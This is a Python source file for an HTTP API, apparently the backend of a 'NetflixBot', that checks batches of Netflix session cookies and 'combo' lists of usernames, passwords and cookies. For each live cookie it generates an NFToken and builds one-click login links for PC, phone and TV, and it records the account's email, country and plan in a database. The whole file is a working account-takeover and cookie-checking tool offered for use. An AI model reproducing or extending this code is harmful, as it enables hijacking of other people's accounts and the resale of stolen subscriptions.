"""
HTTP API server for the web app.

Exposes the bot's real Netflix logic (check cookie, generate NFToken,
3-device login links) so the web app can call it through a Vercel
serverless proxy.

Endpoints:
  POST /api/check-cookie   {cookie} -> {status, country, plan, email, links, expires}
  POST /api/batch-check    {cookies: []} -> {results: []}
  POST /api/combo-check    {combos: []} -> {results: []}
"""

import json
import logging
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import quote

from config import SUPABASE_URL, SUPABASE_SERVICE_KEY

logger = logging.getLogger("NetflixBot")

_server = None
_rate = {}  # ip -> [timestamps]
_RATE_LIMIT = 60
_RATE_WINDOW = 60
_RATE_LIMITS = {
    "/api/check-cookie": (60, 60),
    "/api/batch-check": (60, 60),
    "/api/combo-check": (60, 60),
}
_MAX_BATCH_CHECK = 100
_MAX_BODY_SIZE = 1_000_000
_MAX_COOKIE_LEN = 5000
_MAX_COMBO_CHECK = 100


class ReusableThreadingHTTPServer(ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def _json_response(handler, status, payload):
    raw = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(raw)))
    handler.send_header("Access-Control-Allow-Origin", "*")
    handler.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
    handler.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
    handler.end_headers()
    handler.wfile.write(raw)


def _rate_limited(ip, path=""):
    limit, window = _RATE_LIMIT, _RATE_WINDOW
    for prefix, (l, w) in _RATE_LIMITS.items():
        if path.startswith(prefix):
            limit, window = l, w
            break
    now = time.time()
    with threading.Lock():
        key = f"{ip}|{path}"
        ts = _rate.get(key, [])
        ts = [t for t in ts if now - t < window]
        if len(ts) >= limit:
            _rate[key] = ts
            return True
        ts.append(now)
        _rate[key] = ts
    return False


def _clean_cookie_line(line):
    if not isinstance(line, str):
        return ""
    line = line.strip()
    line = "".join(ch for ch in line if ch >= " " or ch == "\t")
    if len(line) > _MAX_COOKIE_LEN:
        return ""
    return line


def _parse_cookie_parts(raw_line):
    from checker import parse_cookie_line
    netflix_id, secure_id, extras = parse_cookie_line(raw_line or "")
    parts = {}
    if netflix_id:
        parts["NetflixId"] = netflix_id
    if secure_id:
        parts["SecureNetflixId"] = secure_id
    if extras:
        parts.update(extras)
    return parts


def _build_device_links(token):
    if not token:
        return {}
    if "+" in token or "/" in token:
        try:
            token = quote(token, safe="")
        except Exception:
            pass
    return {
        "pc": f"https://netflix.com/?nftoken={token}",
        "phone": f"https://netflix.com/unsupported?nftoken={token}",
        "tv": f"https://netflix.com/tv2?nftoken={token}",
        "login": f"https://www.netflix.com/login?nftoken={token}",
    }


def _check_and_link(cookie_line):
    """Check a cookie and generate a real NFToken + 3-device links."""
    from checker import check_cookie, generate_nftoken
    from supabase_client import update_cookie_status

    parts = _parse_cookie_parts(cookie_line)
    if not parts.get("NetflixId"):
        return {"status": "ERROR", "error": "Missing NetflixId"}

    info = check_cookie(parts["NetflixId"], parts.get("SecureNetflixId"))
    status = info.get("status")

    # Cookie DEAD → đánh dấu dead trên Supabase
    if status == "DEAD":
        update_cookie_status(cookie_line, "dead", dead_reason=info.get("status"))
    elif status == "LIVE":
        # Upsert check result to Supabase so the web map reflects real status
        update_cookie_status(
            cookie_line,
            "green",
            country_code=info.get("country"),
            plan_name=info.get("plan"),
            email=info.get("email"),
        )

    result = {
        "status": status,
        "country": info.get("country"),
        "plan": info.get("plan"),
        "email": info.get("email"),
        "membershipStatus": info.get("membershipStatus"),
    }

    if status == "LIVE":
        token, err = generate_nftoken(parts)
        if token:
            result["token"] = token
            result["links"] = _build_device_links(token)
            result["expires"] = "60 phút"
        else:
            result["tokenError"] = err
    return result


def _handle_tools(handler, method, path, body):
    if method == "POST" and path == "/api/check-cookie":
        cookie = _clean_cookie_line((body or {}).get("cookie", ""))
        if not cookie:
            _json_response(handler, 400, {"success": False, "error": "Missing or invalid cookie"})
            return
        result = _check_and_link(cookie)
        _json_response(handler, 200, {"success": True, "result": result})
        return

    if method == "POST" and path == "/api/batch-check":
        cookies = (body or {}).get("cookies") or []
        if not isinstance(cookies, list):
            _json_response(handler, 400, {"success": False, "error": "cookies must be an array"})
            return
        cookies = [_clean_cookie_line(c) for c in cookies]
        cookies = [c for c in cookies if c]
        if len(cookies) > _MAX_BATCH_CHECK:
            cookies = cookies[:_MAX_BATCH_CHECK]
        results = [_check_and_link(c) for c in cookies]
        _json_response(handler, 200, {"success": True, "results": results})
        return

    if method == "POST" and path == "/api/combo-check":
        combos = (body or {}).get("combos") or []
        if not isinstance(combos, list):
            _json_response(handler, 400, {"success": False, "error": "combos must be an array"})
            return
        if len(combos) > _MAX_COMBO_CHECK:
            combos = combos[:_MAX_COMBO_CHECK]
        results = []
        for combo in combos:
            if not isinstance(combo, str) or len(combo) > _MAX_COOKIE_LEN:
                continue
            parts = combo.split(":", 2)
            if len(parts) == 3:
                user, pw, cookie = parts
            else:
                user, pw, cookie = combo.split("|", 2) if "|" in combo else (combo, "", "")
            res = _check_and_link(cookie)
            res["user"] = user
            results.append(res)
        _json_response(handler, 200, {"success": True, "results": results})
        return

    _json_response(handler, 404, {"success": False, "error": "Not found"})


def start_api_server(bot=None):
    global _server
    if _server is not None:
        return _server

    class ApiHandler(BaseHTTPRequestHandler):
        def _handle(self):
            ip = self.client_address[0]
            path = self.path.split("?")[0]
            if _rate_limited(ip, path):
                _json_response(self, 429, {"success": False, "error": "Rate limited"})
                return
            try:
                length = int(self.headers.get("Content-Length", "0") or 0)
            except ValueError:
                length = 0
            if length > _MAX_BODY_SIZE:
                _json_response(self, 413, {"success": False, "error": "Payload too large"})
                return
            raw = self.rfile.read(length or 0)
            body = {}
            if raw:
                try:
                    body = json.loads(raw.decode("utf-8") or "{}")
                except Exception:
                    _json_response(self, 400, {"success": False, "error": "Invalid JSON body"})
                    return
                if not isinstance(body, dict):
                    _json_response(self, 400, {"success": False, "error": "Body must be a JSON object"})
                    return
            if path.startswith("/api/"):
                _handle_tools(self, self.command, path, body)
            else:
                _json_response(self, 404, {"success": False, "error": "Not found"})

        def do_GET(self):
            self._handle()

        def do_POST(self):
            self._handle()

        def do_OPTIONS(self):
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
            self.end_headers()

        def log_message(self, fmt, *args):
            logger.info("[API] " + fmt, *args)

    port = int(os.getenv("API_PORT", "8081"))
    _server = ReusableThreadingHTTPServer(("0.0.0.0", port), ApiHandler)
    thread = threading.Thread(target=_server.serve_forever, daemon=True, name="api-server")
    thread.start()
    logger.info("[API] Listening at http://0.0.0.0:%d", port)
    return _server
